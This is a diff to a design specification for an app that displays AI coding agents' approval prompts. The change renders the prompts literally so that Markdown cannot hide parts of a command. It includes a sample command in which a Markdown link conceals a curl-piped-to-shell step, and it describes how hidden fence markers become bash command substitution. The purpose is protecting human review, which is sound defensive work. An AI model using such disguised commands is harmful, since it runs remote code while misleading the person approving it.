@@ -405,7 +405,7 @@ Sections, top to bottom:
    - Approvals (`kind: approval`, not `answerAtMachine`) can be answered inline: "Approve
      once" (Bridge) and "Deny" (secondary). They are the card's own buttons: the same
      request, progress and outcomes. The action is the whole prompt, drawn as the card
-     draws it with code literal, since Approve once allows all of it; one too long to show
+     draws it, exactly as written (§6.4), since Approve once allows all of it; one too long to show
      whole (an edit's diff, a long command), with a table, not shaped as a host writes a
      permission (prose, then at most one fenced block ending it, its fence naming no
      language but json or diff, no link, whose words hide where it goes, and no character
@@ -590,14 +590,14 @@ joined words at a separator, since a fact can carry a delegate's name (#286).
   line break, never the lines it wraps into, and not the blank lines a fence may end with. Needs you
   still refuses such a prompt outright and sends the person to the card (§6.1). The Windows app does
   this since #296 and the PWA since #415, which draws every code span in a sentence the same way.
-- **An approval's card** (#220): all of the message is drawn this way, escaped (right-to-left
-  letters included) and left to right, with Approve once still offered. A Codex approval carries
-  its command in prose ("Codex wants to run: …"), so outside its fences an approval's text is
-  drawn as its literal source, never as Markdown, its line breaks kept (#415): a link, a code
-  span, a backslash escape or emphasis would otherwise hide part of the command
-  (`echo "[safe](https://a/";curl …|sh;")"` drawn as `echo "safe"`). A fence opens only on a
-  language name, since the rest of its opening line is not drawn. Other questions draw as
-  written, as Markdown.
+- **An approval's card** (#220): an approval's message is drawn exactly as written, fence markers
+  included, in the code face; nothing in it is read as Markdown. Its line breaks are kept, it reads
+  left to right, and it is escaped as a code block is (right-to-left letters included), with
+  Approve once still offered. A Codex approval carries its command in prose ("Codex wants to run:
+  …"), and any structure a parser decides can hide part of what runs (#415): a link draws
+  `echo "[safe](https://a/";curl…|sh;")"` as `echo "safe"`, `*tmp*` loses its stars, and a fence's
+  own line of three backticks, hidden as a marker, is a command substitution in bash. Other
+  questions and the conversation keep their Markdown.
 
 ### 6.5 Reply box
 
@@ -761,8 +761,8 @@ file from them ([design/README.md](../../design/README.md#app-icon)).
 - **What Copy copies is what is on screen** (§6.4, #220): a code block's escapes, right-to-left
   letters' included, are copied as drawn, so the text pasted is never different from the text read.
   Reading Hebrew or Arabic in code and in approvals is the harder for it, by the owner's choice (#253).
-  An approval's text outside its fences is shown as the agent wrote it, Markdown marks and all
-  (§6.4, #415).
+  An approval's message is drawn exactly as written, fence markers included, in the code face;
+  nothing in it is read as Markdown (§6.4, #415).
 
 ## 9. Accessibility
 
